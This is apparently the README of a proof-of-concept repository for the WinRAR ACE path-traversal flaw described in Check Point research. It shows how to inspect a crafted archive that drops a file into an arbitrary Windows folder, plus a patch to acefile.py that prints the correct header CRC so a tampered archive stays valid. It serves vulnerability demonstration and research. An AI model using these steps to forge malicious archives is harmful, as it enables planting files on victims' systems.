# acefile

poc file of [extracting-code-execution-from-winrar](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

check the file use command:
```
python acefile.py --headers 1.rar
```

When the 1.rar is unzipped, a file named demo2.txt will be released to dir `c:\c2\demo123\`.


Modification of acefile.py:
```
      if ace_crc16(buf) != hcrc:
            print("[+] right_hdr_crc : {} | struct {} ".format(hex(ace_crc16(buf)),struct.pack('<H', ace_crc16(buf))))
            print("[*] current_hdr_crc : {} | struct {}".format(hex(hcrc),struct.pack('<H', hcrc)))
```

output acefile right crc for change the rar file ~ 

thx for the author of acefile.py [@droe](https://github.com/droe)